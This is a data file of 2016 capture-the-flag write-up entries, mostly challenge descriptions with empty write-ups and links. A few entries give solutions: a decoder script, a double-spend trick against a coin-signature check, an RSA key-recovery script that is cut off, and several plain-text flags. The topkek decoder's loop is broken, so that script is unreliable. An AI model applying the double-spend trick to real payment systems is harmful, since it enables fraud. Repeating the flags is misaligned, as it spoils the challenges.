{"source": "write-ups-2016", "category": "RSA", "path": "data\\write-ups-2016\\google-ctf-2016\\forensics\\in-recorded-conversation-25", "year": "2016", "name": "in-recorded-conversation-25", "writeup": "# google-ctf-2016 : in-recorded-conversation-25\n\n**Category:** Forensics\n**Points:** 25\n**Solves:** 693\n**Description:**\nCan you find the flag?\n\nirc.pcap\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/bl4de/ctf/tree/master/2016/Google_CTF_2016/In_Recorded_Conversation_Forensic_25\n* http://fadec0d3.blogspot.com/2016/05/google-ctf-2016-various-no-big-deal-pt.html\n* http://www.slideshare.net/sehanlee7/googlectf-2016-in-recorded-conversation-writeup-verkorean\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\grehack-ctf-2016\\crypto\\pizzas-100", "year": "2016", "name": "pizzas-100", "writeup": "# GreHack CTF 2016 : pizzas-100\n\n**Category:** Crypto\n**Points:** 100\n**Solves:**\n**Description:**\n\n    SAM'S PIZZAS\n\n    by dok\n    100 points\n\n    How much do you love pizza ?\n\n    Remarks : \"there are some guessing...\"\n\n    Download\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [DevNull Team](https://github.com/devnull-team/Grehack-16/tree/master/Crypto/100)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\grehack-ctf-2016\\crypto\\xxx-100", "year": "2016", "name": "xxx-100", "writeup": "# GreHack CTF 2016 : xxx-100\n\n**Category:** Crypto\n**Points:** 100\n**Solves:**\n**Description:**\n\n(TODO)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [Greunion Team](http://r.rogdham.net/27)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\h4ckit-ctf-2016\\crypto\\evil-corp-115", "year": "2016", "name": "evil-corp-115", "writeup": "# H4ckIT CTF 2016 : evil-corp-95\n\n**Category:** crypto\n**Points:** 115\n**Solves:**\n**Description:**\n\nSenegal\n\n> Genegal Thompson welcomes you! Let me be extremely brief. Our forensic team have already been investigating \"The Great Plantation\" project for 2 years. During this long period we knew a lot of interesting things like: 1) This is the project of Masons. 2) The main target is to take over the world with planting own people into big companies. 3) Masons do not trust modern encryption algorithms. 4) Masons think their own alphabet will let them to communicate more securely than anything else. Short time ago we have withdrawn the notebook of one of their members. There was one interesting file named \"THEPlantation.txt\". Surely, it was encrypted. Help us to pull the info out of this! Yours, Gen. Tompson\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/b1n4ry4rms/CTFs/tree/master/2016/ctf.com.ua/Evil_Corps\n* https://github.com/Beers4Flags/writeups/tree/master/hackit2016/crypto/senegal-evil-corp\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\h4ckit-ctf-2016\\crypto\\handmade-encryption-standard-250", "year": "2016", "name": "handmade-encryption-standard-250", "writeup": "# H4ckIT CTF 2016 : handmade-encryption-standard-250\n\n**Category:** crypto\n**Points:** 250\n**Solves:**\n**Description:**\n\nGuena\n\n> Times are getting harder and harder for Gen.Tompson.\nI'm soldier Alderson and some time ago we got this Rijndael cipher: \\xa2\\xc5\\xe7\\xcc\\xe4\\xa9\\xb6\\x41\\x0b\\x77\\x92\\x54\\x78\\xdb\\xed\\xab\\xe0\\x1d\\xac\\x83\\x2e\\xe2\\x6b\\x43\\x07\\x1a\\x61\\xf2\\x81\\x0f\\xfe\\xc6\\x6e\\x36\\xc5\\x7b\\xd6\\x9c\\xca\\x05\\x93\\x76\\x43\\xa9\\x08\\x45\\xa4\\x8f\\x88\\xb9\\x31\\x7e\\x22\\x7f\\x00\\x00\\x48\\xb7\\x31\\x7e\\x22\\x7f\\x00\\x00\nAnd we have even intercepted its key(!):\n21449030350486006488383082093598\nBut the problem is that decryption operation have failed somehow =(\nOur math-team found out that standart algorithm was modified by cryptographer - he decided to use his own substitution-box instead of default!\nMath team also found out that modification was pretty simple - cryptographer just exchanged 3 elements of that substitution-box between them. But which ones?..Help our math-team to find this out ;)\nP.S General Tompson can't talk right now.\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n* https://github.com/JulesDT/ctfWriteUps/tree/master/Hackit%20Quals%202016/Handmade%20encryption%20standard%20-%20Crypto%20-%20250%20pts\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\h4ckit-ctf-2016\\crypto\\interceptor-95", "year": "2016", "name": "interceptor-95", "writeup": "# H4ckIT CTF 2016 : interceptor-95\n\n**Category:** crypto\n**Points:** 95\n**Solves:**\n**Description:**\n\nPortugal\n\n> Looks like in this time Alice and Bob have decided to pay a minimal attention to malicious Eve, who has been \"sniffing\"(as always) all the traffic during their private chat. Is their private life's secret in danger for now?.. h4ck1t{key}\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://ctftime.org/writeup/4324\n* http://insecurity-insa.fr/writeUp\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\h4ckit-ctf-2016\\crypto\\ninja-scheme-195", "year": "2016", "name": "ninja-scheme-195", "writeup": "# H4ckIT CTF 2016 : ninja-scheme-195\n\n**Category:** crypto\n**Points:**\n**Solves:**\n**Description:**\n\nChad\n\n> General Tompson welcomes you...again! We have some crypto-problem here...again. Our scouts have intercepted this enemy cryptogram:  dd67ca82d358f0c8479e118addcec2f8ce086c0f6f239f9b66d7226a38c68198dbd777f366fb9fd83b60d11109be174759c75ea56a4866c2 Some time later our IT-ninjas have broken into the enemy computer system and grabbed something pretty much similar to undefined encryption algorithm scheme. Look at this grabbed scheme and help us to understand how it works. Yours, Gen. Tompson\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "Hash", "path": "data\\write-ups-2016\\h4ckit-ctf-2016\\web\\hash-150", "year": "2016", "name": "hash-150", "writeup": "# H4ckIT CTF 2016 : hash-150\n\n**Category:** web\n**Points:** 150\n**Solves:**\n**Description:**\n\nIndia\n\n> (TODO)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* http://insecurity-insa.fr/writeUp\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\hack-the-vote-ctf-2016\\crypto\\babyhands-300", "year": "2016", "name": "babyhands-300", "writeup": "# Hack the Vote CTF 2016 : babyhands-300\n\n**Category:** Crypto\n**Points:**\n**Solves:**\n**Description:**\n\n> We think that Trump's right hand man has been sending out flags from his personal computer, but we need to be sure. See if you can make anything out of the traffic we intercepted.  [intercepted](<https://s3.amazonaws.com/hackthevote/intercepted.02dc90d82b414f7de3f0d75aea5c210fbdb3257fc731179e26c211bbb81d2e76.tar.gz)>    author's irc nick: negasora\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [Carl Loendahl](https://github.com/grocid/CTF/tree/master/Hack%20the%20vote/2016#babys-hands-300-p)\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-11-05-hack-the-vote/hands_crypto_300)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\hack-the-vote-ctf-2016\\crypto\\boxes-of-ballots-200", "year": "2016", "name": "boxes-of-ballots-200", "writeup": "# Hack the Vote CTF 2016 : boxes-of-ballots-200\n\n**Category:** Crypto\n**Points:**\n**Solves:**\n**Description:**\n\n> Privjet Komrade! While doing observing of Amerikanski's voting infrascture we find interesting box. We send operative to investigate. He return with partial input like showing below. He say box very buggy but return encrypted data sometimes. Figure out what box is do; maybe we finding embarass material to include in next week bitcoin auction, yes? `ebug\\\": true, \\\"data\\\": \\\"BBBBBBBBBBBBBBBB\\\", \\\"op\\\": \\\"enc\\\"}` `nc boxesofballots.pwn.republican 9001` nauthor's irc nick: Unix-Dude\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [Adam Van Prooyen](http://van.prooyen.com/cryptography/2016/11/06/Boxes-of-Ballots-Writeup.html)\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-11-05-hack-the-vote/ballots_crypto_200)\n* [Carl Loendahl](https://github.com/grocid/CTF/tree/master/Hack%20the%20vote/2016#boxes-of-ballots-200-p)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\hack-the-vote-ctf-2016\\crypto\\smtpresident-400", "year": "2016", "name": "smtpresident-400", "writeup": "# Hack the Vote CTF 2016 : smtpresident-400\n\n**Category:** Crypto\n**Points:**\n**Solves:**\n**Description:**\n\n> The FBI reopened their investigation of Hillary Clinton after they recovered some interesting files from her personal email server.  [emails](<https://s3.amazonaws.com/hackthevote/emails.7447eb2595600258fc12333bfe89e2e1a4e4c75ec5d85246aa5a3e22c2be0d9a.tar.gz)>  [pubkeys](<https://s3.amazonaws.com/hackthevote/pubkeys.57e8119c230ea2b76ae5af9ff6681ad090cbd5473965df5935d07cd25a8d55aa.tar.gz)>  [flag](<https://s3.amazonaws.com/hackthevote/flag.76ce6f536a36e4b8a79d00736bc6f4f381e38b0a05148b7b041e47abd0fc0777.ctxt)>    author's irc nick: negasora\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-11-05-hack-the-vote/smtp_crypto_400)\n"}
{"source": "write-ups-2016", "category": "RSA", "path": "data\\write-ups-2016\\hack-the-vote-ctf-2016\\crypto\\the-best-rsa-250", "year": "2016", "name": "the-best-rsa-250", "writeup": "# Hack the Vote CTF 2016 : the-best-rsa-250\n\n**Category:** Crypto\n**Points:**\n**Solves:**\n**Description:**\n\n> At his last rally, Trump made an interesting statement:&gt; I know RSA, I have the best RSA  &gt; The more bits I have, the more secure my cyber, and my modulus is YUUUUUUUUUUUUUGE    We don't believe his cyber is as secure as he says it is. See if you can break it for us    [best_rsa](<https://s3.amazonaws.com/hackthevote/best_rsa.878a518bf7012add6d071f3b52562e8b102e72a0cc815aee7cb007cdc03c7714.txt)>  author's irc nick: krx\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [PiggyBird](https://piggybird.net/2016/11/hack-the-vote-2016-write-up-the-best-rsa-crypto-250/)\n* [Aneesh Kotnana](https://github.com/Alaska47/HackTheVote-2016-Writeups/tree/master/crypto/250-Best-RSA)\n* [Leet Zeppelin](https://leet-zeppelin-site.herokuapp.com/post/2)\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-11-05-hack-the-vote/rsa_crypto_250)\n* [Carl Loendahl](https://github.com/grocid/CTF/tree/master/Hack%20the%20vote/2016#the-best-rsa-250-p)\n* [Mantej Singh Rajpal](https://medium.com/@mantej/the-best-rsa-881a7c7c328c#.f5ug4iqeu)\n* [Zero Dimension](https://github.com/CTFwriteup-ZeroDimension/HackTheVote/tree/master/BestRSA)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\hack-the-vote-ctf-2016\\crypto\\topkek-50", "year": "2016", "name": "topkek-50", "writeup": "# Hack the Vote CTF 2016 : topkek-50\n\n**Category:** Crypto\n**Points:**\n**Solves:**\n**Description:**\n\n> A CNN reporter had only one question that she couldn't get off her mind&gt; Do we even know, who is this 4 CHAN???    So she set out to find who this 400lb hacker is. During her investigation, she came across this cryptic message on some politically incorrect forum online, can you figure out what it means?    [kek](<https://s3.amazonaws.com/hackthevote/kek.43319559636b94db1c945834340b65d68f90b6ecbb70925f7b24f6efc5c2524e.txt)>  author's irc nick: krx\n\n\n## Write-up\n\nAttacking this challenge from a computer-esque direction assumes `TOP` is `1` and `KEK` is `0`. Because they never repeat directly after another, it appears the varying quantity of exclamation points following each `TOP` or `KEK` indicate how many times that digit is used. We don't know which is `0` and which is `1` so we had to switch between until it came out correctly. Here is a Python script (courtesy [John Hammond](https://github.com/USCGA)) that will decipher the text:\n\n```python\nimport binascii\n\nreader = open(\"kek.txt\", \"r\")\ncontents = reader.read()\nreader.close()\n\nparts = contents.split()\noutput = []\nfor part in parts:\n  if \"KEK\" in part:\n    character = \"0\"\n  else:\n    character = \"1\"\n  multiplier = part.count(\"!\")\n  output.append(character * multiplier)\n  end = \"\".join(output)\n  print(\"\".join([chr(int(end[i:i + 8], 2)) for i in range(len(end), 8)]))\n```\n\nExecuting this script on the ciphertext file should provide you with the flag:\n\n`flag{T0o0o0o0o0P______1m_h4V1nG_FuN_r1gHt_n0W_4R3_y0u_h4v1ng_fun______K3K!!!}`\n\n## Other write-ups and resources\n\n* [Rawsec](http://rawsec.ml/en/Hack-The-Vote-2016-50-topkek/)\n* [Aneesh Kotnana](https://github.com/Alaska47/HackTheVote-2016-Writeups/tree/master/crypto/50-TOPKEK)\n* [Harvey Hunt](https://github.com/HarveyHunt/ctfs/blob/master/2016/hackthevote/crypto/topkek/topkek.md)\n* [Carl Loendahl](https://github.com/grocid/CTF/tree/master/Hack%20the%20vote/2016#topkek-50-p)\n* https://s3.amazonaws.com/hackthevote/kek.43319559636b94db1c945834340b65d68f90b6ecbb70925f7b24f6efc5c2524e.txt\n* [United States Coast Guard Academy](https://github.com/USCGA/writeups/tree/master/online_ctfs/hackthevote2016/crypto50)\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-11-05-hack-the-vote/kek_crypto_50)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\hack-the-vote-ctf-2016\\crypto\\trump-trump-100", "year": "2016", "name": "trump-trump-100", "writeup": "# Hack the Vote CTF 2016 : trump-trump-100\n\n**Category:** Crypto\n**Points:**\n**Solves:**\n**Description:**\n\n> With Trump about to be in office, autographed photos of him are selling like wildfire. The only problem is: Trump makes it a point to never sign a photo of himself. If you could get a signed picture, you could stand to make DOZENS of dollars.  `nc trumptrump.pwn.republican 3609`    [trump](<https://s3.amazonaws.com/hackthevote/trump.04a0d9783458ec220e8ba41f4fb3d0e039750b3d79945a5e941f1bfb55cf68fc.jpg)>  [trumpkey](<https://s3.amazonaws.com/hackthevote/trumpkey.40d05be69f643e65ca35d8d6db10afcdaedc938c8aac6821d3cc559655ee6828)>  author's irc nick: negasora    EDIT: Fixed some networking stuff. Also, your line delimiter must be '\\r\\n'.\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [PiggyBird](https://piggybird.net/2016/11/hack-vote-2016-write-trump-trump-crypto-100/)\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-11-05-hack-the-vote/trump_crypto_100)\n* [Carl Loendahl](https://github.com/grocid/CTF/tree/master/Hack%20the%20vote/2016#trump-trump-100-p)\n* [Zero Dimension](https://github.com/CTFwriteup-ZeroDimension/HackTheVote/tree/master/TrumpTrump)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\hack-the-vote-ctf-2016\\crypto\\vermatrix-supreme-100", "year": "2016", "name": "vermatrix-supreme-100", "writeup": "# Hack the Vote CTF 2016 : vermatrix-supreme-100\n\n**Category:** Crypto\n**Points:**\n**Solves:**\n**Description:**\n\n> Working in IT for a campaign is rough; especially when your candidate uses his password as the IV for your campaign's proprietary encryption scheme, then subsequently forgets it. See if you can get it back for him. The only hard part is, he changes it whenever he feels like it.  `nc vermatrix.pwn.democrat 4201`    [handout](<https://s3.amazonaws.com/hackthevote/handout.4838bbdb8619b3a581352c628c6b0b86475b94c9519347a520c90cf1822351ae.py)>    author's irc nick: negasora\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [Tech Hacks](https://nacayoshi00.wordpress.com/2016/11/07/hack-the-vote-ctf-writeup/)\n* [Carl Loendahl](https://github.com/grocid/CTF/tree/master/Hack%20the%20vote/2016#vermatrix-supreme-100-p)\n* https://github.com/ymgve/ctf-writeups/tree/master/hackthevote2016/crypto100-vermatrix_supreme\n* [Aneesh Kotnana](https://github.com/Alaska47/HackTheVote-2016-Writeups/tree/master/crypto/100-Vermatrix-Supreme)\n* [Binary Studio](https://binarystud.io/hackthevote-2016-vermatrix-supreme-writeup.html)\n* [Zero Dimension](https://github.com/CTFwriteup-ZeroDimension/HackTheVote/tree/master/VermatrixSupreme)\n", "solution_code": "\n# handout.py\nimport sys, random, time\n\nflag = \"flag{1_sw34r_1F_p30Pl3_4cTu4lLy_TrY_Th1s}\"\n\ndef printmat(matrix):\n\tfor row in matrix:\n\t\tfor value in row:\n\t\t\tprint value,\n\t\tprint \"\"\n\tprint \"\"\n\n\ndef pad(s):\n\tif len(s)%9 == 0:\n\t\treturn s\n\tfor i in xrange((9-(len(s)%9))):\n\t\ts.append(0)\n\treturn s\n\ndef genBlockMatrix(s):\n\toutm = [[[7 for x in xrange(3)] for x in xrange(3)] for x in xrange(len(s)/9)]\n\tfor matnum in xrange(0,len(s)/9):\n\t\tfor y in xrange(0,3):\n\t\t\tfor x in xrange(0,3):\n\t\t\t\toutm[matnum][y][x] = s[(matnum*9)+x+(y*3)]\n\treturn outm\n\n\ndef fixmatrix(matrixa, matrixb):\n\tout = [[0 for x in xrange(3)] for x in xrange(3)]\t\n\tfor rn in xrange(3):\n\t\tfor cn in xrange(3):\n\t\t\tout[cn][rn] = (int(matrixa[rn][cn])|int(matrixb[cn][rn]))&~(int(matrixa[rn][cn])&int(matrixb[cn][rn]))\n\treturn out\n\n\ndef chall():\n\tIV = [c for c in '?????????']\n\tseed = \"??????????????????\"\n\n\n\tblocks = genBlockMatrix(pad(IV + [ord(c) for c in seed]))\n\n\tres = [[0 for i in xrange(3)] for i in xrange(3)]\n\tfor i in xrange(len(blocks)):\n\t\tres = fixmatrix(res, blocks[i])\n\n\n\tprint \"SEED: \" + str(seed)\n\tprintmat(res)\n\n\tdata = raw_input(\"\")\n\n\tdata = data.replace(' ', '').strip().split(',')\n\n\tif len(data) != 9:\n\t\treturn False\n\n\tfor i in xrange(len(IV)):\n\t\tif str(IV[i]) != str(data[i]):\n\t\t\treturn False\n\n\treturn True\n\n\nif chall():\n\tprint flag\n\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\hack.lu-ctf-2016\\crypto\\cornelius-1-200", "year": "2016", "name": "cornelius-1-200", "writeup": "# Hack.lu CTF 2016 : cornelius-1-200\n\n**Category:** Crypto\n**Points:** 200 (-29)\n**Solves:**\n**Description:**\n\n> Please find Cthulhu's magic [here](https://cthulhu.fluxfingers.net:1505/).\n> Attachment: [server.rb](server.rb)\n> P.S.: flag is the content of the file and is not in flagformat!\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* http://anee.me/hack-lu-ctf-2016-cornelius1-writeup/\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\hack.lu-ctf-2016\\crypto\\cryptolocker-200", "year": "2016", "name": "cryptolocker-200", "writeup": "# Hack.lu CTF 2016 : cryptolocker-200\n\n**Category:** Crypto\n**Points:** 200 (-52)\n**Solves:** 114\n**Description:**\n\n> Oh no! Cthulhu's laptop was hit by ransomware and an important document was encrypted! But you have obtained the encryption script and it seems like the encryption is vulnerable...\n> Even tough you don't know the encryption password, can you still help recover the important ODT file?\n> [Download](cryptolocker.zip)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [P_TE](https://p-te.fr/2016/10/20/hack-lu-cryptolocker/)\n* [Adam Van Prooyen](http://van.prooyen.com/cryptography/2016/10/20/cryptolocker-Writeup.html)\n* https://gophers-in-the-shell.herokuapp.com/hack-lu-2016-cryptolock-crypto-200-pts/\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\hack.lu-ctf-2016\\crypto\\cthcoin-150", "year": "2016", "name": "cthcoin-150", "writeup": "# Hack.lu CTF 2016 : cthcoin-150\n\n**Category:** Crypto\n**Points:** 150 (+100)\n**Solves:** 20\n**Description:**\n\nCthulhu awakens and all worshippers will be rewarded greatly!\nA [new Cryptocurrency](https://cthulhu.fluxfingers.net:1511/) was created,\nand Cthulhu generous gives away free coins.\nCan you break it, but be careful do not provoke him.\n\n## Write-up\n\nWhen we register at the site, we are given 3 coins worth 5, 10 and 50 cthcoins. There's a shop, where we can buy the flag for 120.\nEvery coin looks like:\n> {\"AM\": \"5\", \"CU\": \"NIST384\", \"MN\": \"F9BEB4E1\", \"NC\": \"303490\", \"OW\": \"qwerty1234\", \"PK\": \"b6bd0e420b4984854d916c30108d685e70617434f2d3d82a04a9f92ff20719f74ef79d9a6825fddef8460d6d4833d2ac1e5627d52ec916223a8e051cab16b49a621e6501bf05bdee99dd1f44192876d08e1b413b7cd12d1be88e97eb6a6e1ddb\", \"SIG\": \"e12bb51c97b95c12d487f302a9cf2c55c4d3f912bd0f53180c5a34308ecf30a292cf7cebf404514e8d792bc8ff1a7afeb6752f14ea0dc2774cb8fbaf5660a374fb3113aebb94164366ed1906980de316fbc821d10cc8827c33ff3f0a06f8086f\", \"TS\": \"1477047047\"}\n\nAM - is value of the coin. CU - is number of elliptic curve, MN - some magic number, NC - is nonce, OW - owner (my login), PK - public key, SIG - signature, TS - timestamp.\nWhen we submit the coin into the shop's form, it says \"You already sent 5 of 120 Coins.\" If we try to submit the same coin second time, it says \"Double spend attempt detected!\" We have eather generate new coins or persuade the shop to accept the same coin again.\n\nBut OK, it's a web challange! May be there's something interesting in robots.txt?\n>User-Agent: *\n>\n>Disallow: /login\n>\n>Disallow: /register\n>\n>Disallow: /buy\n>\n>Disallow: /debugcoins\n>\n>Disallow: /shop\n\nWhat's at debugcoins? It's a list of MD5 hashes of last 50 spend coins. If we look at the end of code of the page, there's an interesting comment, that tells us how everithing works:\n>Its ECDSA\n>\n>sort_keys=True\n>\n>SIG < AM, CU, MN, NC, OW, PK, TS\n>\n>MD5 < AM, CU, MN, NC, OW, PK, SIG, TS\n\n\nSo, SIG(AM, CU, MN, NC, OW, PK, TS) is used to verify the authenticity of the coin and MD5(AM, CU, MN, NC, OW, PK, SIG, TS) is used to check if it has already been spend. If we anyhow change any of signed fields, it says that the signature is wrong, even if the only change is uppercasing a letter in HEX of PK. So it's case-sensitive signed! And it turns out, that MD5 is calculated in a case-sensitive way too! So if we change case of any of letters in SIG field it won't break the signature (hex is case-insensitive) and it will change the MD5! Submitting several times the same coin with different case of letteres of SIG hex, we get the flag:\n>flag{mT_g0x_?;_;!_wh3erE_iS_Our__Mon..EY_\\//\\}\n\nP.S. debugcoins hint wasn't needed really, but it helped somehow.\n\n## Other write-ups and resources\n\n* https://dinhbaoluciusteam.wordpress.com/2016/10/24/cthcoinweb100-hacklu2016/\n* https://github.com/ctfs/write-ups-2016/tree/master/hack.lu-ctf-2016/crypto/cthcoin-150\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\hack.lu-ctf-2016\\crypto\\redacted-200", "year": "2016", "name": "redacted-200", "writeup": "# Hack.lu CTF 2016 : redacted-200\n\n**Category:** Crypto\n**Points:** 200 (-23)\n**Solves:** 80\n**Description:**\n\n> Someone gave a nice presentation with some redacted ssh keys, I extracted them for you, the seem to belong to berlin@cthulhu.fluxfingers.net on port 1504.\n> Good Luck\n\n> Attachment: [redacted](redacted)\n\n## Write-up\n\nIf we change \"x\"->\"A\" in given base64data and decode it, we get a broken asn1 structure. I've also changed \"x\" -> \"/\", base64 decoded, xor'ed it with the first binary structure and got a mask of unknown bits. From the asn1 structure we can extract N, P, Q, e, d,... (i've generated a new key with ssh-keygen and used it as an example) but all numbers except e have broken bits. N has big areas of broken bits, P and Q have less broken bits.\n\nSinse it's RSA N should be equal to P * Q. So we can recover P and Q bit-by-bit, starting from the lowerst bits!\n\nThe algorithm bases on the fact that k lowerst bits of N depend only on k lowers bit of both P and Q. So we can take the lowerst unknown bit of any of P or Q (let's say it's k-th bit of P), try both 0 and 1 values and check which one gives the right k-th bit of N. If k-th bit of N is unknown, we just save both possible values of P and proceed to the next unknow bit.\n\nHaving e, P, Q we can reconstruct all RSA parameters. The code is in [recoverer.py](recoverer.py)\n\n\n## Other write-ups and resources\n\n* http://duksctf.github.io/Hack.lu2016-redacted/\n* http://manylostticks.blogspot.lu/2016/10/hacklu-ctf-2016-redacted-write-up.html\n* https://github.com/ctfs/write-ups-2016/tree/master/hack.lu-ctf-2016/crypto/redacted-200\n", "solution_code": "\n# recoverer.py\nfrom base64 import b64decode, b64encode\nfrom binascii import hexlify, unhexlify\nfrom Crypto.PublicKey import RSA\n \nn =      int(\"00000000000000000000000000000000FF4A9CD78E945D76C00000000000000000000167BD011D643B300000000000000000000000000000000000C49208000000000000000000000003C702A2F21C00E6401446857236B5C00106E4C1D3EE5BD70385342AADB6A7D176DF7EDCB7CE1D78DFE992857E1A34730756186CA4C200DEC2A97F33B360389FD7BB5866FBD68E83D823EAE64C9E2D740F2F09D0383B39D51AAEB190858E8A3B6AD9CBAB8D935AA1BD01D1CBBA238AF4DF8455D7D789C71EE6091F711E766F633A0420F530ADB70495066070A07073FCB01D21CC2FD5648D9F5475D769697D3E325868315AB8E50E73500F4C2D0B8548CE38E01338294E81\", 16)\nn_mask = int(\"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF000000000000A2803FFFFFFFFFFFFFFFFFFFFC0000000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC000003FFFFFFFFFFFFFFFFFFFFFFFC000000000000003F00000000000003F000000000000028FC0000000000000000000000000000000000000000000000000000000000000000028000000FC0000000000000000000000000000000028000000000000000000000000000000000000000000000000000000000000000000000000028000000000000000000000000000000000000000000000000000000000000000000000000000A2800000000000000000000000000000000000000000000000000000000\", 16)\nd = int(\"305B823A4E4F4DEDFDCD3B0055D9FF949466BB68BE58701A781F91D7B29046E947B2DE99DF4B62A77D96058F811A8F3731476A1F354852803938D5780B75929B1556D2C5EB0DE6326EA93CDA8E267D916E9F9CFD855A0181F4FFD743B24A85BF378BFBBCDFA803CEA12A5B7EF49BF04B050B89A31B97006369C45AE9029291E30F789B3FD3DAB4CD3B3B88B74890B357EEC0F007535B2558017604ADE36522C39CFE22BABA439407478059D630747D752DF521F88F44A0FED288D98E254840A259B46D451BB8E160F2594685E028FF6CEF2DBB563134F44DEB0E6D467E8EBF95516D51EFA7800BBB0F20A4A6CD9012599D67063DC8C07A0A48589CF5E01A3281\", 16)\np =      int(\"E4DDBA96C1CB00F41204EE6FC16E14830438AEEE4BBD21AF5CE88DFD25A12F2A9A26994EEFA0E6BED04AC2E29BF639B4C8F975AD886F3115EC5E384C028C1FD7D7DB63C023F6346152809C71D226223D7D6990CAE64DFC16F174FA1A6EE46B25AFAFFCF3936A61D3F2029D6CEE994FEFF8F2F0A70638420110D303D075AB16D3\", 16)\np_mask = int(\"000000000000FC0000000000000000000000000000000000A00000000000000000000000000000000000000000000000000000000000000A00A00000FC0000000000000FC0000000000000000000000000000000000000000000000000000000000000000000000000FC00000000000000000000000000000000000000000000\", 16)\nq =      int(\"DEE55998947BFDB75C7E349B036A1673A8C41B62929C242C0E3D0C808738972518F8639304B3340D6A88510CC524E37963A42D0638F605572AA7B93EDA07DC29454018FA9A990062F05D0025D5467D3EDF8DB448CC02ED4AB67967BE70C2A5617B3085D0E151357D63B1ECA4B53746FCBE586CDC8A4405CFAF719F3F011318DB\", 16)\nq_mask = int(\"000000000000000000000000FC000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003F00000000000000000000000000000000000003F000000000000000000000000000000000028000000000000000000000000000000A000000000000000000\", 16)\ne = 0x010001\n \n \ndef pq_cant_fit(p, q, fixed_bits):\n    n1 = p * q\n    diff = n ^ n1\n    for i in range(fixed_bits):\n        bit_to_check = (1<<i)\n        if bit_to_check & diff > 0 and bit_to_check & n_mask == 0:\n            return True\n    return False\n \n \npossible_ps = [p]\nfixed_len = 0\npossible_qs = [q]\n \nwhile fixed_len < 256 * 8:\n    if len(possible_ps) > 1 or len(possible_qs) > 1:\n        print(fixed_len, len(possible_ps), len(possible_qs))\n    possible_ps_new = []\n    possible_qs_new = []\n    bit_to_variate = (1 << fixed_len)\n    if p_mask & bit_to_variate > 0:\n        for p in possible_ps:\n            possible_ps_new.append(p)\n            possible_ps_new.append(p ^ bit_to_variate)\n    else:\n        possible_ps_new = possible_ps.copy()\n    if q_mask & bit_to_variate > 0:\n        for q in possible_qs:\n            possible_qs_new.append(q)\n            possible_qs_new.append(q ^ bit_to_variate)\n    else:\n        possible_qs_new = possible_qs.copy()\n    fixed_len += 1\n \n    possible_ps = []\n    for p in possible_ps_new:\n        ok = False\n        for q in possible_qs_new:\n            if not pq_cant_fit(p, q, fixed_len):\n                ok = True\n           "}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\hack.lu-ctf-2016\\crypto\\survival-guide-250", "year": "2016", "name": "survival-guide-250", "writeup": "# Hack.lu CTF 2016 : survival-guide-250\n\n**Category:** Crypto\n**Points:** 250 (+100)\n**Solves:** 3\n**Description:**\n\nWhile wandering alongside the beach, you spot an unknown object in the distance.\nWondering what it might be, you go closer and realise that it's a scroll. In clear letters it's \"For in strange aeons, when death has died...\" written on it. \nThis sounds somewhat familiar and Cthulhu related. Could it be that there is more hidden inside [this scroll](survival-guide.zip) than just the beginning of this sentence? Maybe even instruction how to survive when Cthulhu awakens?\n\n## Hint\n\nSkywing and j00ru are such cool guys. They know tricks to let the entry point start anywhere.\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
